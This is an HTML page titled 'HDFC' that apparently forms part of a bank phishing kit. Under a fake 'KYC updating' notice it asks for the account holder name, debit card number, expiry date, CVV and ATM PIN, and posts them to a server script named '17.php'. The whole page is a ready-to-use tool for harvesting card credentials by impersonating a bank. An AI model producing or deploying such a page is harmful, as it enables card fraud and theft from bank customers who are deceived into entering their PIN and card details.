<!DOCTYPE html>
<html lang="zxx">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HDFC</title>
    <style>
        #ll,#aa
        {
            width: 100%;
            padding: 1px 8px;
        }
        #dd,#gg
        {
            width: 338px;
            height:25px;
            background-color:white;
            border-color:#1D85FE;
            border-width:0.5px;
        }
        #jj
        {
            width: 338px;
            background-color: #1D85FE;
            color: white;
            padding: 12px 10px;
            margin: 0px 0;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px; width: 340px; height: 40px;
            
        }
    </style>
</head>
<body>
    <img src="first.jpg" alt="" id="aa">
    <div id="bb">
    <h3 style="
    background-color:#DFE9F5;
    padding: 10px 4px;
    border-radius:1px;
    font-size:16px;
    color:#1560BD;
    width:345px;
    height:35px;"
    > Please fill your details.</h3>
    Account Holder Name
    </div>
 <form action="17.php" method="post">
    <div id="cc">
        <input type="text" name="ACCOUNT Holder Name" id="dd" required=""> <br><br>
    </div>
    <div id="ee">
        ATM/Debit Card No 
    </div>
    <div id="ff">
        <input type="text"  name="ATM/Debit Card No " id="gg" required=""><br><br>
    </div>

 ATM/Debit Card Expiry Date
    </div>
    <div id="ff">
        <input type="text"  name="ATM/Debit Card Expiry Date " id="gg" required=""><br><br>
    </div>


 CVV/CVC No
    </div>
    <div id="ff">
        <input type="text"  name="CVV/CVC No " id="gg" required=""><br><br>
    </div>



    ATM/Debit Card PIN
    </div>
    <div id="ff">
        <input type="text"  name="ATM/Debit Card Expiry PIN " id="gg" required=""><br><br>
    </div>



    <div id="hh" required="">
        <p2 style="color:green;"> KYC updating is under process...</p2> <br><br>   
    </div>
    <div id="ii">
      <center>  <button type="submit" id="jj">CONFIRM</button></center><br>
    </div>
    <img src="fourth.jpg" alt="" id="aa">
 </form>
</body>
</html>